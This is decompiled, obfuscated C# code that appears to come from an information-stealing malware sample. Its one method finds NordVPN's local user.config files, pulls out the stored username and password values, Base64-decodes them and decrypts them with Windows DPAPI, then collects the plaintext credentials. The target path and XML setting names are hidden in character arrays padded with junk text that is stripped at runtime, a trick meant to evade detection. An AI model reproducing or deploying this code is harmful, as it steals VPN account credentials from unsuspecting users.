using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Xml;
using Microsoft.CSharp.RuntimeBinder;

// Token: 0x02000005 RID: 5
public class Entity21
{
	// Token: 0x06000011 RID: 17 RVA: 0x00003788 File Offset: 0x00001B88
	public static List<Entity12> Id1()
	{
		List<Entity12> list = new List<Entity12>();
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), new string(new char[]
			{
				'N',
				'o',
				'G',
				'e',
				't',
				'D',
				'i',
				'r',
				'e',
				'c',
				't',
				'o',
				'r',
				'i',
				'e',
				's',
				'r',
				'd'
			}).Replace("GetDirectories", string.Empty) + new string(new char[]
			{
				'V',
				'P',
				'E',
				'n',
				't',
				'i',
				't',
				'y',
				'1',
				'2',
				'N'
			}).Replace("Entity12", string.Empty)));
			bool flag = !directoryInfo.Exists;
			if (flag)
			{
				return list;
			}
			for (int i = 3; i < 4; i++)
			{
				string[] array = new string[]
				{
					"",
					"",
					"",
					new string(new char[]
					{
						'N',
						'o',
						'r',
						'd',
						'V',
						'p',
						'n',
						'.',
						'e',
						'x',
						'e',
						'*'
					})
				};
				bool flag2 = i == 3;
				if (flag2)
				{
					foreach (object arg in directoryInfo.EnumerateDirectories(array[i]))
					{
						if (Entity21.<>o__0.<>p__1 == null)
						{
							Entity21.<>o__0.<>p__1 = CallSite<Func<CallSite, object, IEnumerable>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(IEnumerable), typeof(Entity21)));
						}
						Func<CallSite, object, IEnumerable> target = Entity21.<>o__0.<>p__1.Target;
						CallSite <>p__ = Entity21.<>o__0.<>p__1;
						if (Entity21.<>o__0.<>p__0 == null)
						{
							Entity21.<>o__0.<>p__0 = CallSite<Func<CallSite, object, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "EnumerateDirectories", null, typeof(Entity21), new CSharpArgumentInfo[]
							{
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
							}));
						}
						using (IEnumerator enumerator2 = target(<>p__, Entity21.<>o__0.<>p__0.Target(Entity21.<>o__0.<>p__0, arg)).GetEnumerator())
						{
							while (enumerator2.MoveNext())
							{
								if (Entity21.<>o__0.<>p__2 == null)
								{
									Entity21.<>o__0.<>p__2 = CallSite<Func<CallSite, object, DirectoryInfo>>.Create(Binder.Convert(CSharpBinderFlags.ConvertExplicit, typeof(DirectoryInfo), typeof(Entity21)));
								}
								DirectoryInfo directoryInfo2 = Entity21.<>o__0.<>p__2.Target(Entity21.<>o__0.<>p__2, enumerator2.Current);
								try
								{
									string text = Path.Combine(directoryInfo2.FullName, new string(new char[]
									{
										'u',
										's',
										'e',
										'r',
										'.',
										'c',
										'o',
										'n',
										'f',
										'i',
										'g'
									}));
									bool flag3 = File.Exists(text);
									if (flag3)
									{
										XmlDocument xmlDocument = new XmlDocument();
										xmlDocument.Load(text);
										string innerText = xmlDocument.SelectSingleNode(new string(new char[]
										{
											' ',
											'/',
											'/',
											's',
											'e',
											't',
											't',
											'S',
											't',
											'r',
											'i',
											'n',
											'g',
											'.',
											'R',
											'e',
											'p',
											'l',
											'a',
											'c',
											'e',
											'i',
											'n',
											'g',
											'[',
											'@',
											'n',
											'a',
											'm',
											'e',
											'=',
											'\\',
											'U',
											'S',
											't',
											'r',
											'i',
											'n',
											'g',
											'.',
											'R',
											'e',
											'p',
											'l',
											'a',
											'c',
											'e',
											's',
											'e',
											'r',
											'n',
											'a',
											'm',
											'e',
											'\\',
											']',
											'/',
											'v',
											'a',
											'S',
											't',
											'r',
											'i',
											'n',
											'g',
											'.',
											'R',
											'e',
											'p',
											'l',
											'a',
											'c',
											'e',
											'l',
											'u',
											'e'
										}).Replace("String.Replace", string.Empty)).InnerText;
										string innerText2 = xmlDocument.SelectSingleNode(new string(new char[]
										{
											'/',
											'/',
											's',
											'e',
											't',
											't',
											'i',
											'n',
											'S',
											't',
											'r',
											'i',
											'n',
											'g',
											'.',
											'R',
											'e',
											'm',
											'o',
											'v',
											'e',
											'g',
											'[',
											'@',
											'n',
											'a',
											'm',
											'e',
											'=',
											'\\',
											'P',
											'a',
											's',
											's',
											'w',
											'S',
											't',
											'r',
											'i',
											'n',
											'g',
											'.',
											'R',
											'e',
											'm',
											'o',
											'v',
											'e',
											'o',
											'r',
											'd',
											'\\',
											']',
											'/',
											'v',
											'a',
											'l',
											'u',
											'S',
											't',
											'r',
											'i',
											'n',
											'g',
											'.',
											'R',
											'e',
											'm',
											'o',
											'v',
											'e',
											'e'
										}).Replace("String.Remove", string.Empty)).InnerText;
										bool flag4 = !string.IsNullOrWhiteSpace(innerText) && !string.IsNullOrWhiteSpace(innerText2);
										if (flag4)
										{
											string @string = Encoding.UTF8.GetString(Convert.FromBase64CharArray(innerText.ToCharArray(), 0, innerText.Length));
											string string2 = Encoding.UTF8.GetString(Convert.FromBase64CharArray(innerText2.ToCharArray(), 0, innerText2.Length));
											string decoded = CryptoHelper.GetDecoded(@string, DataProtectionScope.LocalMachine, null);
											string decoded2 = CryptoHelper.GetDecoded(string2, DataProtectionScope.LocalMachine, null);
											bool flag5 = !string.IsNullOrWhiteSpace(decoded) && !string.IsNullOrWhiteSpace(decoded2);
											if (flag5)
											{
												list.Add(new Entity12
												{
													Id2 = decoded,
													Id3 = decoded2
												});
											}
										}
									}
								}
								catch
								{
								}
							}
						}
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}
}
